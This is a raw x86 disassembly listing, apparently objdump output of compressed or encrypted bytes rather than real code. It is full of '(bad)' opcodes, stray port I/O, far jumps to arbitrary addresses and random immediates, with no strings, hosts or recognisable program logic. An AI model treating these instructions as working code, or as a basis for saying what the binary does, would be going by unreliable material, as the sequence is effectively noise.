  4143ac:	mov    ebp,0xe7076f2f
  4143b1:	dec    esp
  4143b2:	or     BYTE PTR [edi+0xf],al
  4143b5:	sub    al,0xeb
  4143b7:	jmp    0x74f5f156
  4143bc:	dec    ebp
  4143bd:	(bad)  
  4143be:	std    
  4143bf:	xchg   edx,eax
  4143c0:	xlat   BYTE PTR ds:[ebx]
  4143c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143c3:	adc    edx,ebp
  4143c5:	aam    0x12
  4143c7:	mov    ch,0xe4
  4143c9:	(bad)  
  4143ca:	push   0x76d78da1
  4143cf:	xchg   esi,eax
  4143d0:	pop    ss
  4143d1:	inc    edi
  4143d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143d4:	jmp    0x414393
  4143d6:	test   al,0x51
  4143d8:	mov    bl,dh
  4143da:	push   eax
  4143db:	in     al,0x78
  4143dd:	push   eax
  4143de:	imul   ebx,DWORD PTR [ebx+ecx*4-0x56],0x5263727d
  4143e6:	push   edi
  4143e7:	add    DWORD PTR [eax],ebp
  4143e9:	and    DWORD PTR [ebp+0x7c8f7cf0],esp
  4143ef:	jo     0x4143b7
  4143f1:	aam    0x19
  4143f3:	into   
  4143f4:	ins    DWORD PTR es:[edi],dx
  4143f5:	dec    esp
  4143f6:	ss aas 
  4143f8:	add    eax,0x1cc7668a
  4143fd:	sbb    al,0xa0
  4143ff:	xor    esi,ecx
  414401:	fcomip st,st(3)
  414403:	dec    ebp
  414404:	mov    bh,BYTE PTR [esi*8+0x390ee0b6]
  41440b:	stos   BYTE PTR es:[edi],al
  41440c:	pusha  
  41440d:	js     0x414426
  41440f:	popf   
  414410:	add    eax,0x79096de6
  414415:	sbb    eax,0x284ce4ed
  41441a:	inc    ecx
  41441b:	stos   DWORD PTR es:[edi],eax
  41441c:	popf   
  41441d:	ja     0x414413
  41441f:	mov    bh,0xd8
  414421:	int    0xa3
  414423:	dec    ebp
  414424:	fdiv   QWORD PTR [edx]
  414426:	and    ch,BYTE PTR [edi-0x4b85f1bc]
  41442c:	in     al,dx
  41442d:	push   edi
  41442e:	icebp  
  41442f:	add    BYTE PTR [ebx-0x7cbfdafa],0xae
  414436:	out    0xd,eax
  414438:	sub    ah,BYTE PTR [edi]
  41443a:	or     ch,bl
  41443c:	pop    esp
  41443d:	cwde   
  41443e:	rcr    DWORD PTR [ebp+0x56],cl
  414441:	xlat   BYTE PTR ds:[ebx]
  414442:	mov    bl,0xd2
  414444:	mov    es,WORD PTR [ebp-0x43177cd5]
  41444a:	test   ecx,eax
  41444c:	clc    
  41444d:	jb     0x414401
  41444f:	lds    eax,FWORD PTR [ecx-0x10]
  414452:	cmp    bh,0xe6
  414455:	push   ecx
  414456:	mov    ecx,0x1a32b601
  41445b:	xchg   ebp,eax
  41445c:	aaa    
  41445d:	mov    eax,DWORD PTR [ecx+0x551d2b14]
  414463:	sub    ebx,DWORD PTR [edx+0x16]
  414466:	pop    edi
  414467:	pop    esi
  414468:	push   esp
  414469:	ret    
  41446a:	adc    al,0x2b
  41446c:	jecxz  0x414473
  41446e:	and    DWORD PTR [esp+edi*8-0x7b],edi
  414472:	jbe    0x414454
  414474:	jle    0x41441b
  414476:	mov    bl,0x0
  414478:	out    dx,al
  414479:	or     cl,ch
  41447b:	test   esp,edx
  41447d:	std    
  41447e:	add    DWORD PTR [esi],edx
  414480:	dec    eax
  414481:	sbb    eax,0x8f8ff588
  414486:	(bad)  
  414487:	fisubr WORD PTR [ecx]
  414489:	inc    ecx
  41448a:	test   BYTE PTR [edi],bl
  41448c:	push   edx
  41448d:	lds    eax,FWORD PTR [ebp+0x7e]
	...
  4144f3:	add    BYTE PTR [ebx+0x73],bl
  4144f6:	inc    edx
  4144f7:	or     eax,0x775f3d6a
  4144fc:	pop    ds
  4144fd:	dec    edi
  4144fe:	or     cl,BYTE PTR [esi+0x7d]
  414501:	call   FWORD PTR [esi]
  414503:	jnp    0x4144f1
  414505:	aad    0x0
  414507:	add    BYTE PTR [ecx+eax*1],al
  41450a:	add    BYTE PTR [eax],al
  41450c:	repnz ss mov ebp,0x29e3b54d
  414513:	fdiv   QWORD PTR [edi+0x1d]
  414516:	adc    BYTE PTR [ecx-0x5946abde],dl
  41451c:	or     al,0x8
  41451e:	lea    eax,[edx+0x762dd286]
  414524:	aad    0x2e
  414526:	or     BYTE PTR [ecx+0x38b97212],ch
  41452c:	cmp    BYTE PTR ds:0x23885d03,bl
  414532:	ret    
  414533:	jae    0x41450c
  414535:	int    0xba
  414537:	icebp  
  414538:	out    dx,eax
  414539:	pop    ss
  41453a:	enter  0x604f,0x5e
  41453e:	xchg   ebp,eax
  41453f:	xlat   BYTE PTR ds:[ebx]
  414540:	pop    ecx
  414541:	dec    esi
  414542:	adc    BYTE PTR [esi+0x52],dh
  414545:	imul   ebp,DWORD PTR [edx],0x224f59b8
  41454b:	cmc    
  41454c:	test   BYTE PTR [ecx],bh
  41454e:	sub    al,0x35
  414550:	shl    ch,0xae
  414553:	xor    al,0x87
  414555:	addr16 sahf 
  414557:	add    dl,bh
  414559:	aas    
  41455a:	inc    edx
  41455b:	pop    eax
  41455c:	gs mov bh,ah
  41455f:	aad    0xe3
  414561:	fisub  DWORD PTR [edx-0x1fcc7022]
  414567:	pop    ds
  414568:	dec    ebp
  414569:	push   cs
  41456a:	jl     0x41453d
  41456c:	mov    edi,0xddd6fdd8
  414571:	push   esp
  414572:	and    al,0xd0
  414574:	bound  eax,QWORD PTR [eax]
  414576:	(bad)  
  414577:	mov    dl,0x93
  414579:	jbe    0x41454f
  41457b:	mov    bh,0x70
  41457d:	adc    eax,DWORD PTR [ecx]
  41457f:	aad    0xda
  414581:	sbb    eax,DWORD PTR [ecx-0x4a]
  414584:	inc    esi
  414585:	(bad)  
  414586:	(bad)  
  414587:	bound  esi,QWORD PTR [eax-0x73b4dfce]
  41458d:	xor    al,0xa9
  41458f:	aas    
  414590:	lahf   
  414591:	repz cmp bh,BYTE PTR [ecx-0x3e5617f8]
  414598:	adc    BYTE PTR [esi+0x4fcf5895],dl
  41459e:	nop
  41459f:	inc    edx
  4145a0:	pop    ds
  4145a1:	xchg   edi,eax
  4145a2:	push   esp
  4145a3:	cs xor bl,cl
  4145a6:	cmp    eax,0x167518bd
  4145ab:	(bad)  
  4145ad:	cmc    
  4145ae:	in     al,dx
  4145af:	call   0xf65:0xe9754375
  4145b6:	sub    al,0xda
  4145b8:	inc    edx
  4145b9:	mov    edi,0x982817af
  4145be:	cld    
  4145bf:	jno    0x4145e7
  4145c1:	pop    edx
  4145c2:	or     DWORD PTR [ebx+0x2a],edx
  4145c5:	icebp  
  4145c6:	sar    BYTE PTR [eax+0x70],0xf7
  4145ca:	pop    eax
  4145cb:	jecxz  0x414618
  4145cd:	daa    
  4145ce:	mov    esi,fs
  4145d0:	test   al,0x11
  4145d2:	inc    edi
  4145d3:	jae    0x414626
  4145d5:	pusha  
  4145d6:	retf   
  4145d7:	icebp  
  4145d8:	popa   
  4145d9:	fbld   TBYTE PTR [eax-0x6b00a2d7]
  4145df:	out    0xda,al
  4145e1:	out    0x19,eax
  4145e3:	add    eax,0xbf326041
  4145e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145e9:	push   edi
  4145ea:	mov    ds:0xc876b7a3,al
  4145ef:	vpaddd xmm3,xmm3,XMMWORD PTR [edx]
  4145f3:	(bad)
  4145f6:	(bad)  
  4145f7:	cmp    eax,0x8a5b41b
  4145fc:	jno    0x41465c
  4145fe:	dec    ebp
  4145ff:	push   cs
  414600:	mov    ebp,0x68a373b8
  414605:	test   eax,0x8fbf299d
  41460a:	and    al,0x68
  41460c:	imul   edi,DWORD PTR [ebx+edi*1+0x11],0x0
	...
  414673:	add    BYTE PTR [edi+0x5e],bh
  414676:	cmc    
  414677:	ins    DWORD PTR es:[edi],dx
  414678:	cmc    
  414679:	out    dx,eax
  41467a:	call   FWORD PTR [esi+0x17]
  41467d:	enter  0xab7a,0xc2
  414681:	dec    edi
  414682:	xor    al,0xa2
  414684:	lock (bad) 
  414686:	add    BYTE PTR [eax],al
  414688:	add    al,0x1
  41468a:	add    BYTE PTR [eax],al
  41468c:	sub    BYTE PTR [edi],dh
  41468e:	pop    ecx
  41468f:	inc    esi
  414690:	inc    eax
  414691:	neg    ebx
  414693:	rcr    DWORD PTR [ecx-0x64],0x2a
  414697:	pop    edx
  414698:	add    eax,0x587022ad
  41469d:	call   0x9ca8:0xe7d4b005
  4146a4:	pop    esp
  4146a5:	sbb    cl,0x40
  4146a8:	mov    cl,0x73
  4146aa:	jae    0x41469f
  4146ac:	mov    edi,0x4bd66355
  4146b1:	mov    dl,0xef
  4146b3:	test   eax,0x1039f5a
  4146b8:	jno    0x414701
  4146ba:	push   eax
  4146bb:	jmp    0x75d4cd7
  4146c0:	sub    ecx,ecx
  4146c2:	xchg   DWORD PTR [edx-0x50570d23],ecx
  4146c8:	jno    0x4146ca
  4146ca:	xchg   edx,eax
  4146cb:	jle    0x414721
  4146cd:	inc    esi
  4146ce:	jge    0x41470b
  4146d0:	iret   
  4146d1:	inc    ebx
  4146d2:	cmp    BYTE PTR [ebp-0x77159d08],bh
  4146d8:	jbe    0x4146e2
  4146da:	dec    di
  4146dc:	push   0xcb1ec08e
  4146e1:	xchg   BYTE PTR [eax+0x6fec551b],cl
  4146e7:	push   ecx
  4146e8:	mov    cl,0x6b
  4146ea:	scas   al,BYTE PTR es:[edi]
  4146eb:	cmp    BYTE PTR [eax+0x60],dl
  4146ee:	xchg   ecx,eax
  4146ef:	leave  
  4146f0:	rcl    BYTE PTR ds:0xd5475af9,0x7
  4146f7:	push   0x5d
  4146f9:	sar    DWORD PTR [esi-0x776e55b7],1
  4146ff:	and    eax,0xc6ea77fb
  414704:	xlat   BYTE PTR ds:[ebx]
  414705:	std    
  414706:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414707:	retf   0x5faf
  41470a:	inc    eax
  41470b:	fimul  WORD PTR [eax-0x2ef3cdfb]
  414711:	pop    esp
  414712:	sub    eax,0x8048dedf
  414717:	je     0x414722
  414719:	leave  
  41471a:	xchg   edx,eax
  41471b:	adc    DWORD PTR [ebp+ebp*2+0xca0d6d8],esi
  414722:	push   ss
  414723:	dec    ebp
  414724:	mov    esp,0xf91509e6
  414729:	rcr    DWORD PTR [edi],0x21
  41472c:	mov    dl,0xa3
  41472e:	pop    edi
  41472f:	(bad)  
  414730:	adc    bh,BYTE PTR [edi-0x6ff1e7b0]
  414736:	xchg   ebx,eax
  414737:	dec    edx
  414738:	cmovge edx,edx
  41473b:	jne    0x41476c
  41473d:	or     dh,BYTE PTR [ecx+0x43021328]
  414743:	loop   0x414759
  414745:	test   BYTE PTR [edi],al
  414747:	mov    eax,ds:0x841cb3d2
  41474c:	mov    bl,cl
  41474e:	mov    BYTE PTR [ebp+edi*1-0x75],bl
  414752:	sahf   
  414753:	into   
  414754:	loopne 0x414784
  414756:	or     esp,edi
  414758:	jb     0x4147d0
  41475a:	sbb    eax,0xf6454ec4
  41475f:	sbb    cl,BYTE PTR cs:[edi-0x76]
  414763:	jo     0x4146e5
  414765:	push   edi
  414766:	inc    ebp
  414767:	in     al,0xf0
  414769:	inc    ecx
  41476a:	adc    eax,0x19da00a1
  41476f:	jne    0x414773
  414771:	test   BYTE PTR [esi+0x3b1fd441],dl
  414777:	xor    eax,0x81943a15
  41477c:	or     DWORD PTR [esi+0x48],0xa603426c
  414783:	inc    ecx
  414784:	(bad)  [eax+0x7006db2e]
  41478a:	and    dh,0xcd
  41478d:	fsub   st,st(4)
  41478f:	int3   
	...
  4147f4:	jle    0x414825
  4147f6:	add    DWORD PTR [ebp+0x51],ebp
  4147f9:	outs   dx,DWORD PTR ds:[esi]
  4147fa:	jle    0x41483b
  4147fc:	aas    
  4147fd:	mov    BYTE PTR [esi],cl
  4147ff:	cmp    eax,0xd961546b
  414804:	hlt    
  414805:	xlat   BYTE PTR ds:[ebx]
  414806:	add    BYTE PTR [eax],al
  414808:	add    al,0x1
  41480a:	add    BYTE PTR [eax],al
  41480c:	and    eax,0xf913d05
  414811:	sub    DWORD PTR [esi],eax
  414813:	mov    al,0x2e
  414815:	loope  0x4147d6
  414817:	dec    esi
  414818:	adc    eax,0xb50d5926
  41481d:	jmp    0x929f:0x1b74605a
  414824:	adc    al,0x5d
  414826:	int3   
  414827:	mov    eax,ds:0xa611abd8
  41482c:	js     0x414804
  41482e:	sub    eax,0x7a46b62e
  414833:	sub    al,0xf0
  414835:	dec    ebx
  414836:	mov    ch,0x2a
  414838:	push   0xe16e4b26
  41483d:	dec    esp
  41483e:	mov    cl,0xb7
  414840:	outs   dx,BYTE PTR ds:[esi]
  414841:	arpl   bx,dx
  414843:	and    bh,dl
  414845:	xchg   ebx,eax
  414846:	mov    ebx,0x8d741524
  41484b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41484c:	sbb    dh,BYTE PTR [ebx]
  41484e:	sbb    ebp,DWORD PTR [esi+0x3c200c00]
  414854:	push   esi
  414855:	outs   dx,DWORD PTR ds:[esi]
  414856:	out    0x87,eax
  414858:	xchg   ebp,eax
  414859:	daa    
  41485a:	gs retf 0x50cd
  41485e:	jmp    0x4148a2
  414860:	mov    ah,0x76
  414862:	xchg   BYTE PTR [eax-0x76],al
  414865:	mov    esp,0x285960c6
  41486a:	rcl    DWORD PTR [ebp-0x5a3ac0b],0x4a
  414871:	or     edx,DWORD PTR [edx-0x9]
  414874:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414875:	cli    
  414876:	js     0x41480a
  414878:	scas   eax,DWORD PTR es:[edi]
  414879:	push   edx
  41487a:	data16 xchg ch,bl
  41487d:	dec    esp
  41487e:	ins    BYTE PTR es:[edi],dx
  41487f:	xor    BYTE PTR [ebp+0x16fb3c38],cl
  414885:	fsub   DWORD PTR [edx+esi*2]
  414888:	fcmovnb st,st(0)
  41488a:	inc    ecx
  41488b:	fwait
  41488c:	xchg   edi,eax
  41488d:	ret    
  41488e:	dec    ebx
  41488f:	mov    es,WORD PTR [ebx]
  414891:	jno    0x4148a7
  414893:	stos   BYTE PTR es:[edi],al
  414894:	push   ds
  414895:	ret    0x84a9
  414898:	sti    
  414899:	daa    
  41489a:	inc    ecx
  41489b:	mov    es,WORD PTR [ebx+0x72]
  41489e:	cs cld 
  4148a0:	lahf   
  4148a1:	outs   dx,DWORD PTR ds:[esi]
  4148a2:	lds    ebp,FWORD PTR [edx-0x52]
  4148a5:	in     eax,dx
  4148a6:	push   es
  4148a7:	and    DWORD PTR [edx],eax
  4148a9:	pusha  
  4148aa:	adc    al,0xac
  4148ac:	pusha  
  4148ad:	jo     0x414867
  4148af:	xor    bh,BYTE PTR [esi+ebp*8+0x7343d669]
  4148b6:	push   esp
  4148b7:	cmp    DWORD PTR gs:[ecx-0x15829772],ecx
  4148be:	test   eax,0x5e5f34cd
  4148c3:	sbb    eax,0x27925fc2
  4148c8:	jmp    0xb0031f4c
  4148cd:	loopne 0x414935
  4148cf:	jns    0x41485b
  4148d1:	mov    edx,DWORD PTR [esp+edi*1]
  4148d4:	loop   0x414912
  4148d6:	pop    ecx
  4148d7:	in     eax,dx
  4148d8:	ins    BYTE PTR es:[edi],dx
  4148d9:	and    eax,0x569e2170
  4148de:	push   edi
  4148df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148e0:	mov    ds:0xa7e4725,eax
  4148e5:	in     al,dx
  4148e6:	pop    ebx
  4148e7:	jmp    0x88d4db76
  4148ec:	jno    0x4148ba
  4148ee:	mov    ebx,0x6d40d082
  4148f3:	scas   al,BYTE PTR es:[edi]
  4148f4:	pop    edi
  4148f5:	out    0xfe,eax
  4148f7:	int3   
  4148f8:	dec    edi
  4148f9:	jle    0x414897
  4148fb:	retf   0xfca3
  4148fe:	jp     0x41491e
  414900:	jae    0x41489f
  414902:	adc    eax,0x9cecaa84
  414907:	mov    al,ds:0xb864053b
  41490c:	push   esp
  41490d:	cmp    DWORD PTR [esi],esp
  41490f:	push   edi
	...
  414974:	or     edi,DWORD PTR [esi-0x2e]
  414977:	and    esi,edi
  414979:	scas   eax,DWORD PTR es:[edi]
  41497a:	sti    
  41497b:	jle    0x414963
  41497d:	pop    edx
  41497e:	push   ds
  41497f:	pop    es
  414980:	dec    ebp
  414981:	sub    BYTE PTR [edx+0xd8f8dd],bl
  414987:	add    BYTE PTR [ecx+eax*1],al
  41498a:	add    BYTE PTR [eax],al
  41498c:	xchg   ebp,eax
  41498d:	or     DWORD PTR ds:0x46a83cf0,edi
  414993:	std    
  414994:	cmp    dl,BYTE PTR [ecx]
  414996:	push   esi
  414997:	aaa    
  414998:	push   ecx
  414999:	test   eax,0x5a7af7a9
  41499e:	in     eax,0xc8
  4149a0:	out    dx,al
  4149a1:	int    0xf2
  4149a3:	jmp    0x3c0fbfb5
  4149a8:	lahf   
  4149a9:	gs push ebp
  4149ab:	xchg   ecx,eax
  4149ac:	cli    
  4149ad:	rcr    BYTE PTR [ebx],1
  4149af:	je     0x414972
  4149b1:	jno    0x41497b
  4149b3:	xor    ch,bl
  4149b5:	mov    ds:0xccf42856,al
  4149ba:	and    eax,0x4c9398c6
  4149bf:	in     eax,0x37
  4149c1:	sbb    BYTE PTR ds:[edx+0x71],bl
  4149c5:	hlt    
  4149c6:	or     al,0xce
  4149c8:	fiadd  WORD PTR [ebp-0x173d71a7]
  4149ce:	mov    esi,0x8eb51217
  4149d3:	mov    WORD PTR [edi],ss
  4149d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149d6:	ss stos BYTE PTR es:[edi],al
  4149d8:	mov    bp,0x29f4
  4149dc:	sbb    ch,BYTE PTR ss:[edx-0x3c]
  4149e0:	mov    edx,0xe4981437
  4149e5:	iret   
  4149e6:	jo     0x4149d1
  4149e8:	cmp    DWORD PTR es:[esp+eax*8+0x15f2cc91],esp
  4149f0:	sbb    DWORD PTR [esp+ebx*1+0x6460dac0],ebp
  4149f7:	xor    esp,esi
  4149f9:	inc    eax
  4149fa:	sar    DWORD PTR [edx],1
  4149fc:	fadd   QWORD PTR [ecx-0x4]
  4149ff:	sub    al,BYTE PTR [eax+0x4c28cc4b]
  414a05:	data16 (bad) 
  414a07:	pop    ebp
  414a08:	push   ss
  414a09:	sbb    BYTE PTR [ebp-0x43],0x2f
  414a0d:	push   eax
  414a0e:	cwde   
  414a0f:	adc    esi,DWORD PTR [esi-0x2d]
  414a12:	and    eax,0x7fff5b89
  414a17:	gs cmp eax,0x44017587
  414a1d:	mov    ebp,0x3cae5c39
  414a22:	sar    BYTE PTR [ecx+ebx*1-0x1adbad8a],cl
  414a29:	cmp    edx,eax
  414a2b:	push   0xfa69be65
  414a30:	imul   edi,DWORD PTR [eax],0x4711d2bb
  414a36:	adc    eax,0x6a85674a
  414a3b:	cwde   
  414a3c:	neg    al
  414a3e:	inc    edi
  414a3f:	fnsave [ecx-0x219d4a46]
  414a45:	push   eax
  414a46:	loop   0x414a70
  414a48:	lahf   
  414a49:	arpl   WORD PTR [ebp-0x27],bp
  414a4c:	xor    BYTE PTR [edi+0x72d43fb6],al
  414a52:	sbb    al,0x34
  414a54:	push   ecx
  414a55:	inc    ecx
  414a56:	int3   
  414a57:	test   BYTE PTR [ebx-0x3a3b2a60],dh
  414a5d:	cmp    eax,0x9d562600
  414a62:	mov    es,esp
  414a64:	dec    ecx
  414a65:	imul   esp,DWORD PTR [edi],0xfffffff5
  414a68:	hlt    
  414a69:	push   edx
  414a6a:	sub    al,0x77
  414a6c:	fs jno 0x414a1b
  414a6f:	ss movq mm6,mm1
  414a73:	inc    edx
  414a74:	mov    DWORD PTR [eax-0x3ff5a7a9],0x1aa18257
  414a7e:	xchg   ecx,eax
  414a7f:	add    al,0xc0
  414a81:	mov    DWORD PTR [ebp-0x1c],ecx
  414a84:	mov    bh,0xc4
  414a86:	jb     0x414a17
  414a88:	in     al,0x54
  414a8a:	mov    DWORD PTR [eax],ecx
  414a8c:	mov    dl,0x4b
  414a8e:	addr16 iret 
	...
  414af4:	lahf   
  414af5:	fnstcw WORD PTR [esi]
  414af7:	ss jle 0x414af1
  414afa:	lahf   
  414afb:	stc    
  414afc:	bound  esp,QWORD PTR [ebx-0x38109c27]
  414b02:	mov    bh,BYTE PTR [ebp-0x4]
  414b05:	fld    DWORD PTR [eax]
  414b07:	add    BYTE PTR [ecx+eax*1],al
  414b0a:	add    BYTE PTR [eax],al
  414b0c:	adc    DWORD PTR [ecx+0x7494800b],0x78
  414b13:	jl     0x414b53
  414b15:	cs ja  0x414b41
  414b18:	pop    DWORD PTR [esi-0x6ce388ce]
  414b1e:	sub    al,0x28
  414b20:	mov    eax,ds:0xc8dfc00d
  414b25:	mov    ds:0xde0ae61d,al
  414b2a:	mov    ds:0x372ae926,al
  414b2f:	call   0x26ddf961
  414b34:	aaa    
  414b35:	jg     0x414afa
  414b37:	push   ecx
  414b38:	int3   
  414b39:	addr16 pushf 
  414b3b:	lock push cs
  414b3d:	cld    
  414b3e:	xor    eax,0xafa6730e
  414b43:	test   DWORD PTR [edx+0x5698327a],ebx
  414b49:	or     eax,0x3613077c
  414b4e:	mov    ecx,0xf3f730f3
  414b53:	cmp    cl,cl
  414b55:	rol    ecx,0x5b
  414b58:	icebp  
  414b59:	imul   ebp,DWORD PTR [eax+0x1b],0xaa3a2b1f
  414b60:	imul   esi,DWORD PTR [esi],0xffffffa0
  414b63:	loope  0x414bac
  414b65:	pop    esp
  414b66:	repz (bad) 
  414b68:	mov    ss:0xeaaf348c,eax
  414b6e:	add    eax,0x1fdb88ae
  414b73:	scas   eax,DWORD PTR es:[edi]
  414b74:	fsubr  DWORD PTR [ebp-0x3c97ca5b]
  414b7a:	or     esp,DWORD PTR [edx]
  414b7c:	(bad)  
  414b7d:	jmp    0xb415:0x6f6aa6cd
  414b84:	rcl    DWORD PTR [esi-0x11],cl
  414b87:	bound  ecx,QWORD PTR [esi]
  414b89:	scas   eax,DWORD PTR es:[edi]
  414b8a:	(bad)  
  414b8b:	sbb    edx,DWORD PTR [ecx]
  414b8d:	dec    esp
  414b8e:	dec    eax
  414b8f:	(bad)  
  414b90:	aas    
  414b91:	push   esp
  414b92:	stos   DWORD PTR es:[edi],eax
  414b93:	mov    eax,0x40e363ad
  414b98:	(bad)  
  414b99:	xchg   edx,eax
  414b9a:	pushf  
  414b9b:	sahf   
  414b9c:	stos   BYTE PTR es:[edi],al
  414b9d:	aad    0x7e
  414b9f:	je     0x414ba7
  414ba1:	and    al,0x96
  414ba3:	out    0xd1,al
  414ba5:	test   DWORD PTR [edx-0x285340d0],ebx
  414bab:	xor    esp,eax
  414bad:	test   eax,0x569688d9
  414bb2:	in     al,0x79
  414bb4:	out    0xfe,al
  414bb6:	add    DWORD PTR [esp+edi*2+0x3],edx
  414bba:	clc    
  414bbb:	fdiv   QWORD PTR [edx]
  414bbd:	cld    
  414bbe:	test   eax,0x327da66e
  414bc3:	xor    al,0x83
  414bc5:	fnstsw WORD PTR [esp+eax*4-0xe6f60]
  414bcc:	inc    esp
  414bcd:	popf   
  414bce:	imul   edx,DWORD PTR [ebx+0x2cf17c18],0xffffffd8
  414bd5:	cld    
  414bd6:	mov    ebp,DWORD PTR fs:[esp+edx*4-0x62461f78]
  414bde:	mov    bh,0x12
  414be0:	(bad)
  414be3:	jmp    0x414bc2
  414be5:	add    eax,0x80f63d62
  414bea:	jns    0x414b98
  414bec:	fbstp  TBYTE PTR [ebx+0x35]
  414bef:	scas   al,BYTE PTR es:[edi]
  414bf0:	add    esi,DWORD PTR [eax]
  414bf2:	dec    ebx
  414bf3:	mov    ah,0x20
  414bf5:	push   es
  414bf6:	bound  ebp,QWORD PTR [edx+0x56]
  414bf9:	sti    
  414bfa:	xchg   edx,eax
  414bfb:	push   ecx
  414bfc:	in     eax,dx
  414bfd:	cmp    cl,BYTE PTR [ecx+0x65]
  414c00:	shl    DWORD PTR [eax],0xc5
  414c03:	xchg   esi,eax
  414c04:	retf   
  414c05:	add    eax,0x3e456081
  414c0a:	mov    ds:0x84ce3311,al
  414c0f:	cmp    BYTE PTR [eax],al
	...
  414c71:	add    BYTE PTR [eax],al
  414c73:	add    BYTE PTR [esp+eiz*2],dh
  414c76:	push   ds
  414c77:	jl     0x414cd7
  414c79:	jle    0x414cf1
  414c7b:	ins    BYTE PTR es:[edi],dx
  414c7c:	out    0x12,al
  414c7e:	adc    ecx,DWORD PTR cs:[edi+0x59]
  414c82:	adc    BYTE PTR [edi+0xdb00],ch
  414c88:	add    al,0x1
  414c8a:	add    BYTE PTR [eax],al
  414c8c:	cmp    BYTE PTR [esi-0x12e1f7b0],al
  414c92:	sahf   
  414c93:	in     al,0xd3
  414c95:	xchg   esi,eax
  414c96:	push   cs
  414c97:	loop   0x414c45
  414c99:	jbe    0x414cb7
  414c9b:	xor    dh,BYTE PTR [edi-0x54]
  414c9e:	pop    edx
  414c9f:	inc    edx
  414ca0:	xor    BYTE PTR [ecx+0x2ff817c7],0xdc
  414ca7:	in     al,0x82
  414ca9:	add    al,0x8
  414cab:	sub    ch,0x91
  414cae:	pop    ecx
  414caf:	inc    esi
  414cb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cb1:	ja     0x414d00
  414cb3:	fldcw  WORD PTR [esi-0x4]
  414cb6:	inc    esi
  414cb7:	loop   0x414c98
  414cb9:	mov    ds:0x492a7b95,eax
  414cbe:	mov    dl,dh
  414cc0:	mov    eax,0x73dcac04
  414cc5:	xor    BYTE PTR [edx+0x3a3725f7],cl
  414ccb:	sti    
  414ccc:	push   0x53
  414cce:	call   FWORD PTR [ecx]
  414cd0:	lds    esi,FWORD PTR [ebx-0x61b71e45]
  414cd6:	cdq    
  414cd7:	jmp    0x414d43
  414cd9:	addr16 inc esp
  414cdb:	mov    DWORD PTR [ebx+0x57147240],eax
  414ce1:	ret    
  414ce2:	pop    esp
  414ce3:	pop    eax
  414ce4:	mov    ah,0x97
  414ce6:	push   ss
  414ce7:	test   al,0x4b
  414ce9:	int    0xc1
  414ceb:	mov    ?,WORD PTR [esi]
  414ced:	js     0x414d49
  414cef:	add    al,0xab
  414cf1:	mov    cl,cl
  414cf3:	(bad)  
  414cf4:	rep lods eax,DWORD PTR ds:[esi]
  414cf6:	inc    ebx
  414cf7:	pushf  
  414cf8:	pop    eax
  414cf9:	out    dx,al
  414cfa:	push   0xffffffbf
  414cfc:	enter  0xdfc1,0xbd
  414d00:	xor    dh,BYTE PTR [esi+0x362f262e]
  414d06:	mov    ebx,0x9b8aac96
  414d0b:	repz cdq 
  414d0d:	bound  edx,QWORD PTR [edi-0x12]
  414d10:	lds    edx,FWORD PTR [edx]
  414d12:	push   DWORD PTR [edx+0x688e6b35]
  414d18:	push   ebp
  414d19:	add    ebx,DWORD PTR gs:[ebx]
  414d1c:	xchg   ebx,eax
  414d1d:	mov    ebx,0x706011e7
  414d22:	iret   
  414d23:	loopne 0x414d91
  414d25:	call   0x304b:0x40f15291
  414d2c:	push   ebx
  414d2d:	popf   
  414d2e:	lods   al,BYTE PTR ds:[esi]
  414d2f:	inc    ecx
  414d30:	ins    DWORD PTR es:[edi],dx
  414d31:	add    ebx,DWORD PTR [ebp+0x40]
  414d34:	pop    edx
  414d35:	mov    esi,0xa1a44f84
  414d3a:	or     BYTE PTR [esi-0x31504968],dh
  414d40:	cdq    
  414d41:	mov    dh,0x20
  414d43:	stos   BYTE PTR es:[edi],al
  414d44:	das    
  414d45:	jb     0x414d74
  414d47:	sbb    eax,0xa9446465
  414d4c:	jmp    0x544e3d48
  414d51:	jmp    0xa93e901a
  414d56:	sbb    eax,0x794b136f
  414d5b:	fs out 0x52,al
  414d5e:	fs (bad) 
  414d60:	out    0x41,al
  414d62:	mov    eax,0xa18ebba6
  414d67:	mov    al,0x74
  414d69:	sbb    BYTE PTR [ecx],ch
  414d6b:	and    ch,al
  414d6d:	push   cs
  414d6e:	call   0x3fed:0x40f8192
  414d75:	fidiv  DWORD PTR [ecx-0x2ecae56b]
  414d7b:	jns    0x414d0c
  414d7d:	jmp    0x414d22
  414d7f:	inc    ecx
  414d80:	cmp    eax,0x2db0320e
  414d85:	mov    ss,WORD PTR [edx+0x74]
  414d88:	out    0x43,eax
  414d8a:	(bad)  [esi+eax*4+0x95f153]
	...
  414df1:	add    BYTE PTR [eax],al
  414df3:	add    BYTE PTR [edi+0x3e911299],dh
  414df9:	fwait
  414dfa:	mov    bh,0xbf
  414dfc:	in     al,dx
  414dfd:	xor    dh,BYTE PTR [esi]
  414dff:	adc    eax,0x980834e7
  414e04:	add    al,0xdc
  414e06:	add    BYTE PTR [eax],al
  414e08:	add    al,0x1
  414e0a:	add    BYTE PTR [eax],al
  414e0c:	jmp    0x972f0354
  414e11:	push   ss
  414e12:	jecxz  0x414db8
  414e14:	stos   BYTE PTR es:[edi],al
  414e15:	mov    esp,DWORD PTR [ecx]
  414e17:	(bad)  
  414e19:	dec    ebp
  414e1a:	dec    esi
  414e1b:	je     0x414dbf
  414e1d:	outs   dx,DWORD PTR ds:[esi]
  414e1e:	into   
  414e1f:	daa    
  414e20:	(bad)  
  414e21:	cmp    ebp,DWORD PTR [edi+edi*8-0x56]
  414e25:	aas    
  414e26:	mov    bl,0x71
  414e28:	or     DWORD PTR [ebx+0x23],eax
  414e2b:	gs fwait
  414e2d:	sub    BYTE PTR [esi],dh
  414e2f:	add    eax,0x45a222d5
  414e34:	add    BYTE PTR [ebx+0x16],dl
  414e37:	pop    ss
